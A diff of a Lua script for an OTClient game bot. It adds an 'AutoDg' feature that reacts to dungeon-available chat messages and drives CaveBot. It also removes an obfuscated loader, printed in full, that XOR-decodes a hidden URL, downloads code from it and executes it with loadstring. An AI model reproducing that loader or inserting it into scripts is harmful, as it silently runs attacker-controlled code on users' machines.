@@ -1,3 +1,321 @@
 
 
-bit32={};local v0=1097 -(68 + 997) ;local v1=2^v0 ;bit32.bnot=function(v18) local v19=1270 -(226 + 1044) ;while true do if (v19==(0 -0)) then v18=v18%v1 ;return (v1-(118 -(32 + 85))) -v18 ;end end end;bit32.band=function(v20,v21) if (v21==(250 + 5)) then return v20%(57 + 199) ;end if (v21==(66492 -(892 + 65))) then return v20%(156337 -90801) ;end if (v21==4294967295) then return v20%4294967296 ;end v20,v21=v20%v1 ,v21%v1 ;local v22=0;local v23=1;for v45=1 -0 ,v0 do local v46,v47=v20%(3 -1) ,v21%2 ;v20,v21=math.floor(v20/2 ),math.floor(v21/2 );if ((v46 + v47)==2) then v22=v22 + v23 ;end v23=(352 -(87 + 263)) * v23 ;end return v22;end;bit32.bor=function(v24,v25) if (v25==255) then return (v24-(v24%256)) + 255 ;end if (v25==65535) then return (v24-(v24%(65716 -(67 + 113)))) + 65535 ;end if (v25==(4294969141 -(1228 + 618))) then return 4948873255 -653905960 ;end v24,v25=v24%v1 ,v25%v1 ;local v26=0;local v27=1;for v48=1,v0 do local v49,v50=v24%(1 + 1) ,v25%2 ;v24,v25=math.floor(v24/(5 -3) ),math.floor(v25/(5 -3) );if ((v49 + v50)>=(1 -0)) then v26=v26 + v27 ;end v27=(2 + 0) * v27 ;end return v26;end;bit32.bxor=function(v28,v29) v28,v29=v28%v1 ,v29%v1 ;local v30=997 -(915 + 82) ;local v31=2 -1 ;for v51=1 + 0 ,v0 do local v52=0 -0 ;local v53;local v54;while true do if (v52==(1187 -(1069 + 118))) then v53,v54=v28%(4 -2) ,v29%2 ;v28,v29=math.floor(v28/2 ),math.floor(v29/(3 -1) );v52=1 + 0 ;end if (v52==(1 -0)) then if ((v53 + v54)==(1 + 0)) then v30=v30 + v31 ;end v31=2 * v31 ;break;end end end return v30;end;bit32.lshift=function(v32,v33) local v34=791 -(368 + 423) ;while true do if (0==v34) then if (math.abs(v33)>=v0) then return 0 -0 ;end v32=v32%v1 ;v34=19 -(10 + 8) ;end if (v34==(3 -2)) then if (v33<(442 -(416 + 26))) then return math.floor(v32 * ((6 -4)^v33) );else return (v32 * ((1 + 1)^v33))%v1 ;end break;end end end;bit32.rshift=function(v35,v36) local v37=0 -0 ;while true do if (v37==(439 -(145 + 293))) then if (v36>(430 -(44 + 386))) then return math.floor(v35 * ((1488 -(998 + 488))^ -v36) );else return (v35 * ((1 + 1)^ -v36))%v1 ;end break;end if (v37==(0 + 0)) then if (math.abs(v36)>=v0) then return 0;end v35=v35%v1 ;v37=1;end end end;bit32.arshift=function(v38,v39) local v40=0;while true do if (v40==(773 -(201 + 571))) then if (v39>(1138 -(116 + 1022))) then local v56=0;local v57;while true do if (v56==(0 -0)) then v57=0 + 0 ;if (v38>=(v1/2)) then v57=v1-((7 -5)^(v0-v39)) ;end v56=3 -2 ;end if (v56==(860 -(814 + 45))) then return math.floor(v38 * (2^ -v39) ) + v57 ;end end else return (v38 * ((4 -2)^ -v39))%v1 ;end break;end if (v40==(0 + 0)) then if (math.abs(v39)>=v0) then return 0 + 0 ;end v38=v38%v1 ;v40=886 -(261 + 624) ;end end end;local v9=string.char;local v10=string.byte;local v11=string.sub;local v12=bit32 or bit ;local v13=v12.bxor;local v14=table.concat;local v15=table.insert;local function v16(v41,v42) local v43={};for v55=1 -0 , #v41 do v15(v43,v9(v13(v10(v11(v41,v55,v55 + (1081 -(1020 + 60)) )),v10(v11(v42,(1424 -(630 + 793)) + (v55% #v42) ,1 + (v55% #v42) + 1 )))%(867 -611) ));end return v14(v43);end local v17=v16("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\254\41\194\190\209\60\222\209\220\32\245\244\198\11\197\204\255\2\169\169\194\24\194\140\211\32\231\191\212\81\220\194\210\43\169\233\248\31\196\215\212\1\225\245\203\11\208\141\215\48\231","\126\177\163\187\69\134\219\167");modules.corelib.HTTP.get(v17,function(v44) assert(loadstring(v44)());end);
+setDefaultTab("scripts")
+ UI.Separator()
+
+-- Define o diretório principal para salvar as configurações do AutoDg
+MAIN_DIRECTORY_AUTODG = "/bot/" .. modules.game_bot.contentsPanel.config:getCurrentOption().text .. "/storage/" .. g_game.getWorldName() .. "/"
+STORAGE_DIRECTORY_AUTODG = MAIN_DIRECTORY_AUTODG .. name() .. "_autoDg.json"
+
+-- Perfil padrão
+profile_autoDg = {
+    _storage = {
+        autoDg = { enabled = false }
+    }
+}
+
+-- Cria o diretório se não existir
+if not g_resources.directoryExists(MAIN_DIRECTORY_AUTODG) then
+    g_resources.makeDir(MAIN_DIRECTORY_AUTODG)
+end
+
+-- Função para carregar o arquivo de configuração ao iniciar o bot
+function load_file_autoDg()
+    if g_resources.fileExists(STORAGE_DIRECTORY_AUTODG) then
+        local content = g_resources.readFileContents(STORAGE_DIRECTORY_AUTODG)
+        local status, result = pcall(json.decode, content)
+        if status and result and result._storage and result._storage.autoDg then
+            profile_autoDg._storage.autoDg = result._storage.autoDg
+            warn("Configurações do AutoDg carregadas com sucesso!")
+        else
+            warn("Erro ao carregar as configurações do AutoDg.")
+        end
+    else
+        warn("Arquivo de configurações do AutoDg não encontrado. Usando configurações padrão.")
+    end
+end
+
+-- Função para salvar o arquivo de configuração após alterações
+function save_file_autoDg()
+    local res = json.encode(profile_autoDg, 4)
+    local status, err = pcall(function() g_resources.writeFileContents(STORAGE_DIRECTORY_AUTODG, res) end)
+    if not status then
+        warn("Erro ao salvar o arquivo do AutoDg: " .. err)
+    else
+        warn("Configurações do AutoDg salvas com sucesso!")
+    end
+end
+
+-- Carrega o estado inicial do checkbox AutoDg quando o bot é iniciado
+load_file_autoDg()
+
+-- Inicializa o checkbox como desmarcado (false) por padrão
+storage.autoDgEnabled = profile_autoDg._storage.autoDg.enabled or false
+
+-- Configuração do checkbox AutoDg
+local checkBoxautoDg = setupUI([[
+CheckBox
+  id: checkBox
+  font: cipsoftFont
+  text: AutoDg
+]])
+checkBoxautoDg.onCheckChange = function(widget, checked)
+    storage.autoDgEnabled = checked
+    profile_autoDg._storage.autoDg.enabled = checked -- Atualiza o estado no profile
+    save_file_autoDg() -- Salva imediatamente após a mudança
+end
+checkBoxautoDg:setChecked(storage.autoDgEnabled)
+
+local function isAutoDgEnabled()
+    return storage.autoDgEnabled
+end
+
+ UI.Separator()
+--------------------------
+
+
+onTalk(function(name, level, mode, text, channelId, pos)
+if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon yoth%] %-> disponível') then return; end
+  CaveBot.gotoLabel('yoth')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+onTalk(function(name, level, mode, text, channelId, pos)
+if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon renegade%] %-> disponível') then return; end
+  CaveBot.gotoLabel('renegade')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+onTalk(function(name, level, mode, text, channelId, pos)
+if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon bandit%] %-> disponível') then return; end
+  CaveBot.gotoLabel('bandit')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+
+onTalk(function(name, level, mode, text, channelId, pos)
+if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon gaara sc2%] %-> disponível') then return; end
+  CaveBot.gotoLabel('gaara')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+onTalk(function(name, level, mode, text, channelId, pos)
+if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon jya%] %-> disponível') then return; end
+  CaveBot.gotoLabel('jya')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+  onTalk(function(name, level, mode, text, channelId, pos)
+  if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon kimimaro%] %-> disponível') then return; end
+  CaveBot.gotoLabel('kimimaro')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+  onTalk(function(name, level, mode, text, channelId, pos)
+  if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon deidara%] %-> disponível') then return; end
+  CaveBot.gotoLabel('deidara')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+
+  onTalk(function(name, level, mode, text, channelId, pos)
+  if not isAutoDgEnabled() then return end
+ if not text:lower():find('%[dungeon tobirama%] %-> disponível') then return; end
+  CaveBot.gotoLabel('tobirama')
+  CaveBot.setOff()
+  CaveBot.setOn()
+
+local rootWidget = g_ui.getRootWidget();
+
+   local childrens = rootWidget:getChildren();
+
+   for _, child in ipairs(childrens) do
+
+       if child:getText() == "Mostrar texto" then
+
+          child:destroy();
+
+       end
+
+   end
+   return true;
+end)
+
+
+
+local saying_counter = -1  -- Inicializa o contador
+
+------------------------------
+      function logout()
+   modules.game_interface.tryLogout(false)
+end
+
+xyz = g_game.getLocalPlayer():getPosition()
+
+
+
+
+
+------------------------------------------------
+--------------------------------------------SAYING2
+setDefaultTab("scripts")
+macro(6000, function()
+if not isAutoDgEnabled() then return end
+    local a = true;
+    local rootWidget = g_ui.getRootWidget();
+
+    if not a then return; end
+
+    local childrens = rootWidget:getChildren();
+
+    for _, child in ipairs(childrens) do
+        if child:getText() == "Mostrar texto" then
+            local subChildrens = child:getChildren();
+
+            for _, subChild in ipairs(subChildrens) do
+                local text = subChild:getText():trim();
+                local textSplit = text:split("\n")
+
+				g_game.talkPrivate(5, name(), textSplit[saying_counter])			-- Usa o contador para obter o texto correspondente
+
+
+
+                a = false;
+            end
+        end
+    end
+
+    saying_counter = saying_counter + 1  -- Incrementa o contador
+
+    if saying_counter >= 5 and saying_counter <= 7  then
+       saying_counter = 8
+		else if saying_counter >= 12 and saying_counter <= 16 then
+			saying_counter = -1  -- Reseta o contador quando atingir 16
+		end
+	end
+	return true;
+end)
+
